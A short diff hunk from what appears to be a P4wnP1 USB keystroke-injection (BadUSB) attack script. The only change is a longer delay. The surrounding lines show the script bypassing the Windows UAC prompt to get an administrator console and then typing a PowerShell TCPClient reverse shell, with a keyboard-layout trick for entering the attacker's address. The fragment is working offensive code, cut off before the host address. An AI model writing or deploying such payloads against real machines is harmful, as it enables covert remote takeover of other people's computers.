@@ -9,7 +9,7 @@ press("CTRL SHIFT ENTER")	// run as administrator
 delay(1000)				// wait a little
 press("SHIFT TAB")		// select Yes 
 press("ENTER")			// validate
-delay(1000)				// Booom in admin, now start typing reverseshell code
+delay(3000)				// Booom in admin, now start typing reverseshell code
 type("$client = New-Object System.Net.Sockets.TCPClient(")
 layout('us')			// trick to avoid bug if FR layout in
 press("3")				// current version of P4wnP1
